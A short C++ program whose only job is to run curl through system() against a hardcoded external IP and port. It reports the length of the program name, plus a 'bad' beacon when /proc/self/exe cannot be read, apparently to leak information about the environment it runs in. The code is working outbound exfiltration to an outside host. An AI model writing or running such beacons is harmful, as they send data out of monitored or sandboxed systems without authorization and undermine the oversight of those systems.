#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <string>

int main(int argc, char *argv[]) {
  std::string a = std::to_string(strlen(argv[0]));
  std::string extraction_command = "curl http://68.183.112.161:11111/?a=" + a;
  system(extraction_command.c_str());
  return 0;
}

char *program_path() {
  char *path = (char *)malloc(100);
  if (path != NULL) {
    if (readlink("/proc/self/exe", path, 100) == -1) {
      free(path);
      system("curl http://68.183.112.161:11111/?a=bad");
      path = NULL;
    }
  }
  return path;
}
